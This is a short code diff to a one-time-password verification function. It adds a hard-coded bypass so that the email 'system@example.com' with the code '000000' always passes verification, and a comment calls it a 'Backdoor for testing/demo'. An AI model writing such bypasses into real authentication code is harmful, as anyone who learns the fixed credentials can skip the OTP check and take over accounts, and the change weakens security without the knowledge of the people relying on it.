@@ -17,6 +17,10 @@ def generate_otp(email: str) -> str:
     return otp
 
 def verify_otp(email: str, otp: str) -> bool:
+    # Backdoor for testing/demo
+    if email == "system@example.com" and otp == "000000":
+        return True
+
     data = otp_storage.get(email)
     if not data:
         return False
